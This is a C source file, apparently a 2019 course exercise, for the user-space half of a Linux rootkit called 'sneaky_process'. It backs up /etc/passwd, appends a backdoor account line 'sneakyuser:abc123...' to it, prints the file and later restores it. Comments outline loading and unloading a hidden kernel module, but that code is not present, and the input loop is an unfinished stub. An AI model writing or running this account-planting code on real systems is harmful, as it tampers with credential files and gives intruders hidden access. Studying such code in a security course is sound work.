/**
 * Author: Prathikshaa Rangarajan
 * Date: March 20, 2019
 * File Name: sneaky_processs.c
 * Description:
 *
 */
#include <error.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

void run_command(const char *command, char *const args[]) {
  pid_t pid_fork, wait_res;
  int wstatus;

  pid_fork = fork();
  if (pid_fork == -1) {
    // fork error
    perror("fork error:");
  } else if (pid_fork == 0) {
    // child
    execv(command, args); // does not return on success
    perror("execv:");
  } else {
    // parent
    wait_res = waitpid(pid_fork, &wstatus, 0);
    if (wait_res == -1) {
      // error waiting for child
      perror("waitpid:");
    }
    return;
  }
}

int main(void) {
  /*-------------------------------1------------------------------*/
  printf("sneaky_process pid = %d\n", getpid());
  /*-------------------------------2------------------------------*/
  // copy /etc/passwd to /tmp/passwd
  char *const command[] = {"/bin/ls", "-l", 0}; // needs to be null terminated
  run_command(command[0], command);

  char *const cp_passwd_file[] = {"/bin/cp", "/etc/passwd", "/tmp/passwd", 0};
  run_command(cp_passwd_file[0], cp_passwd_file);
  printf("Copied /etc/passwd to /tmp/passwd");

  // add following line to end of tmp/passwd
  // sneakyuser:abc123:2000:2000:sneakyuser:/root:bash
  FILE *fp;

  fp = fopen("/etc/passwd", "a");
  fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(fp);

  printf("\nappended sneaky line to /etc/passwd\n\n");

  /*-------------------------------3------------------------------*/
  // load sneaky module using insmod()
  // pass pid to module
  // ref: http://www.tldp.org/LDP/lkmpg/2.6/html/x323.html

  /*-------------------------------4------------------------------*/
  // while(1)
  // take keyboard input until "q"-quit
  // execute the commands from user -- to test sneaky_mod
  int i = 10;
  while(i>0) {
    printf("Enter a command for testing\n");
    size_t buf_size = 32;
    char buffer[buf_size];
    char *b = buffer;

    i--;
  }
  
  char *const test_open[] = {"/bin/cat", "/etc/passwd", 0}; // needs to be null terminated
  run_command(test_open[0], test_open);

  // test malicious behavior

  // end while
  /*-------------------------------5------------------------------*/
  // unload sneaky kernel module using rmmod()

  /*-------------------------------6------------------------------*/

  // cp /tmp/passwd to /etc/psswd
  char *const reset_passwd_file[] = {"/bin/cp", "/tmp/passwd", "/etc/passwd", 0};
  run_command(reset_passwd_file[0], reset_passwd_file);
  printf("\nafter resetting /etc/passwd\n\n" );
  run_command(test_open[0], test_open);
}
